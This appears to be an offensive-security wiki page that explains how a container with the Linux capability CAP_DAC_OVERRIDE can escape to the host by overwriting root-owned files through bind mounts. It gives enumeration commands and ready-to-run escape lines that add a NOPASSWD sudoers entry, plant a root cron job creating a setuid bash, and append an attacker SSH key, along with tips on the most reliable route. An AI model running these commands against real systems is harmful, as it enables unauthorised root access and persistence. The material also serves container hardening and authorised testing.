---
title: "CAP_DAC_OVERRIDE: writing host files past permission checks"
description: "CAP_DAC_OVERRIDE bypasses all discretionary read, write, and execute permission checks. Inside a container it becomes dangerous when any host file is reachable through a bind mount or a mounted host device: the capability lets an attacker overwrite root-owned files such as sudoers, cron entries, or authorized_keys regardless of their mode bits."
keywords:
  - cap_dac_override
  - file permissions
  - bind mount
  - privilege escalation
  - container escape
---

# CAP_DAC_OVERRIDE

`CAP_DAC_OVERRIDE` makes the kernel skip the discretionary access control checks for read, write, and execute on files and directories. Owner and mode bits stop mattering: a process with this capability can write a file mode `0400` owned by root. On its own inside an isolated container it only overrides permissions on the container's own filesystem, which is already attacker-controlled. It becomes an escape when a host path is reachable, because then the capability removes the last barrier to modifying root-owned host files.

Confirm the capability and look for reachable host paths:

```bash
capsh --print | grep -o cap_dac_override
grep CapEff /proc/self/status                 # bit 1 set
mount | grep -vE 'overlay|proc|sysfs|tmpfs|cgroup|mqueue|shm'   # bind mounts from the host
findmnt -o TARGET,SOURCE,OPTIONS | grep -i '\[/'                 # host bind sources
```

## Route: overwrite a reachable host file

Any writable host mount turns this into host code execution. Common high-value targets, chosen by what runs them as root:

```bash
# A docker socket or host /etc bind-mounted in? Write a trusted-key or cron job.
# Example: host /etc is bind-mounted at /host-etc
echo 'www-data ALL=(ALL) NOPASSWD: ALL' >> /host-etc/sudoers.d/win
# Or schedule a root job on the host
echo '* * * * * root cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' \
  > /host-etc/cron.d/win
# Or append an attacker key to the host root account
echo 'ssh-ed25519 AAAA... a' >> /host-root/.ssh/authorized_keys
```

The capability is what lets these writes succeed even though the files are root-owned and mode-restricted: without it, a non-root container UID would be refused.

## Combining with a read primitive

`CAP_DAC_OVERRIDE` pairs naturally with [CAP_DAC_READ_SEARCH](cap-dac-read-search.md). Read-search locates and reads a host file by inode handle; override then lets you write back to reachable host paths. On a fully privileged container both are present, along with a device list that makes mounting the host disk simpler than hunting for an existing bind mount.

## Exploitation notes

- The escape depends on a host path being present in the mount table. Enumerate with `findmnt` and `cat /proc/self/mountinfo`; a bind mount shows a host subtree as the source.
- If no host path is writable, this capability alone does not escape; pivot to [CAP_SYS_ADMIN](cap-sys-admin.md) (mount a host device) or a runtime-socket mount.
- Prefer a cron or sudoers write over editing a running binary: it triggers deterministically and survives without crashing a live service.

## References

- [man 7 capabilities: CAP_DAC_OVERRIDE](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [HackTricks: CAP_DAC_OVERRIDE](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_override)
